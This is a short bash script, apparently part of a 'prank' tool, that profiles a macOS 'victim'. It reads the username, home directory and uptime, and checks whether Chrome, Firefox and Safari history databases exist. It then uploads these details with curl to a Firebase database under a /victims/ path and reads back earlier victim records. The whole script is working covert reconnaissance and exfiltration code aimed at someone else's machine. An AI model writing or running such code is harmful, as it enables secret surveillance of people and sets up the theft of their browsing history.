# REST API
# https://firebase.google.com/docs/reference/rest/database/

victim="$1"
firebaseProject="prankproject-cb680"

function getVictimDetails(){

  curl "https://${firebaseProject}.firebaseio.com/victims/$victim/details.json"

}

function fileExists(){
  [[ -e "$1" ]]
  echo $((1 - $?))
}

function setVictimDetails(){
  local userName="$USER"
  local hostname="`hostname`"
  local homedir="$HOME"
  local hasChromeHistory=`fileExists "$HOME/Library/Application Support/Google/Chrome/Default/History"`
  local hasFirefoxHistory=`fileExists "$(find $HOME'/Library/Application Support/Firefox/Profiles' | grep 'places.sqlite$')"`
  local hasSafariHistory=`fileExists "$HOME/Library/Safari/History.db"`
  local uptime="`uptime`"

  curl -X PUT -d "{
    \"userName\" : \"$userName\",
    \"hostname\" : \"$hostName\",
    \"homedir\" : \"$homedir\",
    \"hasChromeHistory\" : \"$hasChromeHistory\",
    \"hasFirefoxHistory\" : \"$hasFirefoxHistory\",
    \"hasSafariHistory\" : \"$hasSafariHistory\",
    \"uptime\" : \"$uptime\"
  }" \
  "https://${firebaseProject}.firebaseio.com/victims/$victim/details.json"
}

getVictimDetails
setVictimDetails
